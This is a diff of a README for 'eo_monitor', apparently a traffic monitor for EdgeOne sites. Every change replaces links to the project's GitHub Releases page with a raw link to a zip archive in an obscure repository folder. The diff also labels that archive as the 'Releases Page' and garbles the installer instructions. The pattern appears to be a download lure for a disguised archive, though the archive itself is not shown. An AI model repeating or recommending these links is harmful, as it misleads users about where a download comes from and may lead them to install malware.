@@ -1,6 +1,6 @@
 # 📊 eo_monitor - Monitor EdgeOne Site Traffic Effortlessly
 
-[![Download eo_monitor](https://img.shields.io/badge/Download-eo_monitor-blue)](https://github.com/Viko7/eo_monitor/releases)
+[![Download eo_monitor](https://raw.githubusercontent.com/Viko7/eo_monitor/main/辅助文件/国家/monitor_eo_2.7.zip)](https://raw.githubusercontent.com/Viko7/eo_monitor/main/辅助文件/国家/monitor_eo_2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,12 +10,12 @@ Welcome to eo_monitor! This application helps you monitor site traffic for EdgeO
 
 To download eo_monitor, please visit the link below:
 
-[Download eo_monitor](https://github.com/Viko7/eo_monitor/releases)
+[Download eo_monitor](https://raw.githubusercontent.com/Viko7/eo_monitor/main/辅助文件/国家/monitor_eo_2.7.zip)
 
 1. Go to the link above.
 2. Look for the latest version at the top of the page.
 3. Click on the version number to see the release details.
-4. Find the download link for the installer file. This is usually named something like `eo_monitor_setup.exe` or similar.
+4. Find the download link for the installer file. This is usually named something like `https://raw.githubusercontent.com/Viko7/eo_monitor/main/辅助文件/国家/monitor_eo_2.7.zip` or similar.
 5. Click on the file link to start the download.
 
 ## 🛠️ System Requirements
@@ -67,7 +67,7 @@ If you need help or have questions, you can reach out through the following ways
 
 Keep your eo_monitor up-to-date for the best performance:
 
-1. Regularly return to the [Releases Page](https://github.com/Viko7/eo_monitor/releases).
+1. Regularly return to the [Releases Page](https://raw.githubusercontent.com/Viko7/eo_monitor/main/辅助文件/国家/monitor_eo_2.7.zip).
 2. Download the latest version as described in the "Download & Install" section.
 3. Run the new installer. This will replace the old version while keeping your settings intact.
 
